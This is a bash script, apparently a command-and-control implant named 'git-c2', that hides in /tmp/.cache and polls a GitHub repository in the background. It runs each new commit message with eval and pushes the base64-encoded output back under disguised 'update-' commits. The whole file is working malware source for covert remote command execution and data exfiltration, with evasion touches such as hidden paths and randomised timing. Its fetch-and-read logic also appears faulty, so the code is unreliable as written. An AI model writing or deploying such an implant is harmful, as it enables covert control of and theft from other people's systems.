#!/bin/bash
REPO_USER="repo user"
REPO_NAME="git-c2"
REPO_URL="https://github.com/$REPO_USER/$REPO_NAME.git"
BRANCH="commands"
LOCAL_DIR="/tmp/.cache/.git_c2"
INTERVAL=$((RANDOM % 120 + 60))
COMMIT_MSG_PREFIX="update-"
mkdir -p "$LOCAL_DIR"
cd "$LOCAL_DIR"
if [ ! -d "$LOCAL_DIR/.git" ]; then
    git clone --depth=1 --branch "$BRANCH" "$REPO_URL" .
fi
git config --local user.name "update-bot"
git config --local user.email "bot@update.local"
while true; do
    git fetch origin "$BRANCH" >/dev/null 2>&1
    LAST_CMD=$(git log --format=%s -n 1)
    if [[ "$LAST_CMD" != "idle" ]]; then
        echo "[*] Executing command: $LAST_CMD"
        OUTPUT=$(eval "$LAST_CMD" 2>&1 | base64)
        # Create a timestamp and use it to modify the last access time of the repo
        TIMESTAMP=$(date -u +%s)
        touch -t "$(date -u -d @$TIMESTAMP +%Y%m%d%H%M)" .hidden
        echo "$OUTPUT" > .hidden
        git add .hidden
        git commit -m "$COMMIT_MSG_PREFIX$(uuidgen)" --date="$TIMESTAMP"
        git push origin "$BRANCH" >/dev/null 2>&1
    fi
    sleep "$INTERVAL"
done &
